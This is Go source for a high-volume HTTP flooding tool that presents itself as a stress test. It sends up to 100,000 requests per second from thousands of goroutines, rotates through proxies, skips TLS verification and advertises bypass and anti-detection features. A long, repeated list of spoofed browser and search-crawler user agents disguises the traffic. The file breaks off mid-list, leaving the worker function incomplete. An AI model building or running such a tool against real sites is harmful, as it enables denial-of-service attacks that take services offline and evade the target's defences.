package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"golang.org/x/net/http2"
)

var (
	totalRequests   int64
	successRequests int64
	errorRequests   int64
	startTime       time.Time
	proxyList       []string
	proxyIndex      int64
	proxyMutex      sync.RWMutex
)

type Config struct {
	URL         string
	Threads     int
	RPS         int
	Time        int
	ProxyFile   string
	Raw         bool
}

func main() {
	var config Config
	flag.StringVar(&config.URL, "url", "https://example.com", "Target URL")
	flag.IntVar(&config.Threads, "threads", 2000, "Number of concurrent threads")
	flag.IntVar(&config.RPS, "rps", 100000, "Requests per second")
	flag.IntVar(&config.Time, "time", 60, "Duration in seconds (0 = unlimited)")
	flag.StringVar(&config.ProxyFile, "prx", "", "Proxy file path (format: ip:port)")
	flag.BoolVar(&config.Raw, "raw", false, "Run in raw mode (no proxies)")
	flag.Parse()

	if config.URL == "" {
		fmt.Println("❌ URL is required")
		return
	}

	// Load proxies if specified and not in raw mode
	if !config.Raw && config.ProxyFile != "" {
		if err := loadProxies(config.ProxyFile); err != nil {
			fmt.Printf("❌ Error loading proxies: %v\n", err)
			return
		}
		fmt.Printf("📡 Loaded %d proxies\n", len(proxyList))
	} else if config.Raw {
		fmt.Println("🛑 Raw mode enabled: No proxies will be used")
	}

	// Extreme optimization for maximum performance
	runtime.GOMAXPROCS(runtime.NumCPU() * 8)

	fmt.Printf("🚀 EXTREME MEGA ULTRA HIGH PERFORMANCE STRESS TEST 🚀\n")
	fmt.Printf("🎯 Target: %s\n", config.URL)
	fmt.Printf("🔗 Threads: %d\n", config.Threads)
	fmt.Printf("⚡ Target RPS: %d\n", config.RPS)
	if config.Time > 0 {
		fmt.Printf("⏱️  Duration: %d seconds\n", config.Time)
	} else {
		fmt.Printf("⏱️  Duration: Unlimited\n")
	}
	fmt.Printf("🖥️  CPU Cores: %d (Using %d goroutines)\n", runtime.NumCPU(), runtime.NumCPU()*8)
	fmt.Printf("📡 Proxies: %d\n", len(proxyList))
	fmt.Println("🔧 Protocol: Smart HTTP/1.1 + HTTP/2 Mix")
	fmt.Println("🛡️  Features: Fast Proxy Rotation + Advanced Bypass + Anti-Detection")
	fmt.Println("💪 Optimization: Extreme Performance Mode")
	fmt.Println(strings.Repeat("=", 85))

	startTime = time.Now()

	// Create large client pools
	numClientPools := 50
	clientPools := make([]*ClientPool, numClientPools)

	for i := 0; i < numClientPools; i++ {
		clientPools[i] = createClientPool(i, config.Raw)
	}

	// Start statistics monitor
	go printAdvancedStats()

	// Create worker system with extreme parallelism
	numWorkerGroups := runtime.NumCPU() * 4
	rpsPerGroup := config.RPS / numWorkerGroups

	var wg sync.WaitGroup

	for groupID := 0; groupID < numWorkerGroups; groupID++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			runExtremeWorkerGroup(id, config, clientPools, rpsPerGroup)
		}(groupID)
	}

	wg.Wait()
	printFinalStats()
}

type ClientPool struct {
	HTTP1Clients []*http.Client
	HTTP2Clients []*http.Client
	ProxyStart   int
}

func createClientPool(poolID int, rawMode bool) *ClientPool {
	poolSize := 20
	pool := &ClientPool{
		HTTP1Clients: make([]*http.Client, poolSize),
		HTTP2Clients: make([]*http.Client, poolSize),
		ProxyStart:   poolID * poolSize,
	}

	for i := 0; i < poolSize; i++ {
		if rawMode {
			pool.HTTP1Clients[i] = createOptimizedHTTP1Client(-1) // No proxy
			pool.HTTP2Clients[i] = createOptimizedHTTP2Client(-1) // No proxy
		} else {
			pool.HTTP1Clients[i] = createOptimizedHTTP1Client(pool.ProxyStart + i)
			pool.HTTP2Clients[i] = createOptimizedHTTP2Client(pool.ProxyStart + i)
		}
	}

	return pool
}

func loadProxies(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" && !strings.HasPrefix(proxy, "#") {
			if strings.Contains(proxy, ":") {
				proxyList = append(proxyList, proxy)
			}
		}
	}
	return scanner.Err()
}

func getNextProxy() string {
	if len(proxyList) == 0 {
		return ""
	}

	index := atomic.AddInt64(&proxyIndex, 1) % int64(len(proxyList))
	return proxyList[index]
}

func createOptimizedHTTP1Client(clientID int) *http.Client {
	proxy := ""
	if clientID >= 0 && len(proxyList) > 0 && clientID < len(proxyList) {
		proxy = proxyList[clientID%len(proxyList)]
	}

	var transport *http.Transport

	if proxy != "" {
		proxyURL, _ := url.Parse("http://" + proxy)
		transport = &http.Transport{
			Proxy:                 http.ProxyURL(proxyURL),
			MaxIdleConns:          2000,
			MaxIdleConnsPerHost:   500,
			MaxConnsPerHost:       1000,
			IdleConnTimeout:       60 * time.Second,
			TLSHandshakeTimeout:   2 * time.Second,
			ExpectContinueTimeout: 500 * time.Millisecond,
			ResponseHeaderTimeout: 3 * time.Second,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS10,
			},
			DisableCompression: true,
			DisableKeepAlives:  false,
			ForceAttemptHTTP2:  false,
			WriteBufferSize:    32 * 1024,
			ReadBufferSize:     32 * 1024,
			DialContext: (&net.Dialer{
				Timeout:   1 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
		}
	} else {
		transport = &http.Transport{
			MaxIdleConns:          2000,
			MaxIdleConnsPerHost:   500,
			MaxConnsPerHost:       1000,
			IdleConnTimeout:       60 * time.Second,
			TLSHandshakeTimeout:   2 * time.Second,
			ExpectContinueTimeout: 500 * time.Millisecond,
			ResponseHeaderTimeout: 3 * time.Second,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS10,
			},
			DisableCompression: true,
			DisableKeepAlives:  false,
			ForceAttemptHTTP2:  false,
			WriteBufferSize:    32 * 1024,
			ReadBufferSize:     32 * 1024,
			DialContext: (&net.Dialer{
				Timeout:   1 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
		}
	}

	return &http.Client{
		Transport: transport,
		Timeout:   3 * time.Second,
	}
}

func createOptimizedHTTP2Client(clientID int) *http.Client {
	transport := &http2.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			NextProtos:         []string{"h2", "http/1.1"},
		},
		DisableCompression:   true,
		AllowHTTP:           false,
		MaxHeaderListSize:   32768,
		WriteByteTimeout:    2 * time.Second,
		ReadIdleTimeout:     30 * time.Second,
		PingTimeout:         5 * time.Second,
		MaxReadFrameSize:    1 << 20,
	}

	return &http.Client{
		Transport: transport,
		Timeout:   3 * time.Second,
	}
}

func runExtremeWorkerGroup(groupID int, config Config, clientPools []*ClientPool, rps int) {
	batchSize := calculateOptimalBatchSize(rps)
	interval := time.Second / time.Duration(rps/batchSize)

	if interval < time.Millisecond {
		interval = time.Millisecond
	}

	rateLimiter := time.NewTicker(interval)
	defer rateLimiter.Stop()

	workersPerGroup := config.Threads / (runtime.NumCPU() * 4)
	if workersPerGroup < 20 {
		workersPerGroup = 20
	}

	workChan := make(chan RequestTask, workersPerGroup*10)
	var wg sync.WaitGroup

	for i := 0; i < workersPerGroup; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			poolIndex := workerID % len(clientPools)
			clientPool := clientPools[poolIndex]
			extremeWorker(workerID, workChan, clientPool, config.URL)
		}(i)
	}

	go func() {
		requestID := int64(groupID) * 10000000
		endTime := time.Now().Add(time.Duration(config.Time) * time.Second)

		for {
			if config.Time > 0 && time.Now().After(endTime) {
				break
			}

			select {
			case <-rateLimiter.C:
				for b := 0; b < batchSize; b++ {
					task := RequestTask{
						ID:        atomic.AddInt64(&requestID, 1),
						Timestamp: time.Now().UnixNano(),
					}

					select {
					case workChan <- task:
					default:
					}
				}
			}
		}
		close(workChan)
	}()

	wg.Wait()
}

type RequestTask struct {
	ID        int64
	Timestamp int64
}

func calculateOptimalBatchSize(rps int) int {
	if rps >= 100000 {
		return rps / 2000
	} else if rps >= 50000 {
		return rps / 5000
	} else if rps >= 10000 {
		return rps / 10000
	}
	return 1
}

func extremeWorker(workerID int, workChan <-chan RequestTask, clientPool *ClientPool, baseURL string) {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
		"Googlebot/2.1 (+http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
		"POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
  "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
  "portalmmm/2.0 N410i(c20;TB) ",
  "Python-urllib/2.5",
  "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
  "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
  "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
  "SearchExpress",
  "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
  "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
  "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
  "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
  "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonT100/R101",
  "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
  "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
  "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
  "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
  "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
  "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
  "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
  "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonT68/R201A",
  "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
  "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
  "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
  "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
  "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
  "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
  "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
 "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1", "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1", "portalmmm/2.0 N410i(c20;TB) ", "Python-urllib/2.5", "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3", "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)", "SearchExpress", "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)", "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0", "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT100/R101", "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00", "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00", "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10", "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01", "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10", "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30", "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0", "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT68/R201A", "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]", "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0", "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102", "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0", "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123", "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
	"Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2",
	"Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5",
	"Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 6.0; U; Gecko/20100115; pl) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 5.1; U; de) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.10",
	"Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10",
	"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10",
	"Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01","POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
  "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
  "portalmmm/2.0 N410i(c20;TB) ",
  "Python-urllib/2.5",
  "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
  "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
  "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
  "SearchExpress",
  "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
  "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
  "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
  "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
  "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
  "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
  "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
  "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
  "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1", "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1", "portalmmm/2.0 N410i(c20;TB) ", "Python-urllib/2.5", "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3", "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)", "SearchExpress", "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)", "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0", "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT100/R101", "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00", "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00", "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10", "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01", "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10", "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30", "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0", "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT68/R201A", "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]", "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0", "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102", "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0", "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123", "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
